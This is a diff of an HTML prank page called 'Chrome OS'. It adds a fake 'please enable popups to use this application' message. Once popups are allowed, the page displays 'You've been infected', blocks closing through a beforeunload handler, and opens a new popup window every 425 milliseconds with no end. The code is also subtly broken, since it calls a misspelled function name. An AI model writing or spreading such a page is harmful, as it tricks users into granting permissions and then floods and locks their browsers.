@@ -2,10 +2,16 @@
 <html>
   <head>
     <title>Chrome OS</title>
+    <style> .hide {display:none;}</style>
   </head>
   <body id="body">
+<div id="main-content" class="hide">Tabs <br>&copy; 2018-19 <a href="github.com/chexbox">chexbox</a><h1>You've been infected with CHROME OS</h1></div>
+<div id="popups" class="hide">Please enable popups to use this application. Once you enable popups, <button onclick="window.location.reload(false);">Try Again</button><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAIAAAD8GO2jAAAABmJLR0QA/wD/AP+gvaeTAAADFklEQVRIie2UXUhTYRjHn3PSNveR2cTmNzIv0mZGViSm0UVQ0k1eWM0KzMyMAo26KIguvIikwojCBPswIiyz78Q50gY2nTotzKNm2o6M7bTN5Tbd1znn7SI25yZFVlCw/9XD++N9/vD83/fBEELwN4X/1e4hg3/YgDFeOj2gRwAA9uHRq9c/6di54g8YsJ9Jxf0RxRQAAC+BM9muM7Nzxe8bIJ0ath/wyNtdAIBzuUIu5l8scIFmmV8wQDNvbXxZQaK+lZwJpqxdUae+WddRfuK96vnLrJw25Re68/ybFrtnuLZ592Uq8EqwATKTU5GJ0aslWWNjXc5ASqu7m7D04sN5pYKBO3jmzvilQoGht1Mr7waBMEl2cCX/pwbTSuMQ+eHaDR0uMLRqAkduHzFPCzkY4KukAr1OuHGFWaWwiI+lGuWfu1z8nMigdmGBB+7OCV7ZiQ3SJeCQGPNfUfRGHHzrCiFeHN+oMtEQa7VypBnC9Thb9Rg11KaO1rf2ZBUUBGcUYGDqVte2OSqLEIiZSQtNPXx7OzuhnzCICFcSq+0nDCLx5j2Uuup2akpERsUmPIoXk2aOlXBE21Yt61onWCBRLLRNfyZvBsjwWnn8PrMW6Z70LNlbn79GM0rCbM+w6GS1lK/0Q7cKi91d+6vDrzSmEWdePIsUW7TgQxUrtXflDtfE1PKS3MLk74kjr5yjJbmK7lnk0LTn7WgsqbOxiOk7e6esxeOPthwg7G7tKZlqjEGzjc2yhiF/RD14UVQ/ZZ+26a3etnMjwrClyStSuMBNF8dTX80C72MnXcgPpdhmbAjDcQAAPAzD5yNmq3SN/FFW7sumce/u8M8AuRkPgJugmLQoK2GiAaxWjjQjAvNDzoy4aAzDnZ5ZBBaTg0bzEJ/i7rp3qK8marDXieZnAABAD76rLNWHQ9TRi1vHznX6Hjt45tCRC7FhYY7s6JZSmVsW65mgTZLBER9yKztqnpKZ/BhZEd/753wZuD6W79N8YdECWhwKzADgB19uccg/A0T1kAQx+WY8eLEvDnkVWhUhg//A4BtLFBpWy+h5tQAAAABJRU5ErkJggg==" alt="" width="24px" />
+<br><br> Note: This web application is intended for desktop users. It works best in Chrome or IE.</div>
     <script>
-      window.addEventListener("beforeunload",function(e){(e||window.event).returnValue=false;return false;});
+      function perventClose(){
+      	window.addEventListener("beforeunload",function(e){(e||window.event).returnValue=false;return false;});
+      }
       function getRandomColor(){
         var letters='0123456789ABCDEF';
         var color='#';
@@ -15,13 +21,25 @@
         return color;
       }
       function newTab(){
-        var lin=document.getElementById("link");
-        lin.href=window.location;
-        lin.click();
+        return window.open(window.location, "_blank", "width=600,height=600");
       }
-      document.getElementById("body").style.backgroundColor=getRandomColor();
-      window.setInterval(function(){newTab();},425);
+      function test(){
+      	return window.open();
+      }
+      var t;
+      function run(){
+      	t = test();
+      	if (t !== undefined && t !== null){
+      	  t.close();
+      	  preventClose();
+      	  document.getElementById("main-content").classList.remove("hide");
+      	  document.getElementById("body").style.backgroundColor=getRandomColor();
+      	  window.setInterval(function(){console.log(newTab());},425);
+        } else {
+      	  document.getElementById("popups").classList.remove("hide");
+        }
+      }
+      run();
     </script>
-    Tabs <br>&copy; 2018-19 <a href="github.com/chexbox">chexbox</a><h1>You've been infected with CHROME OS</h1><a id="link" target="_blank"></a>
   </body>
 </html>
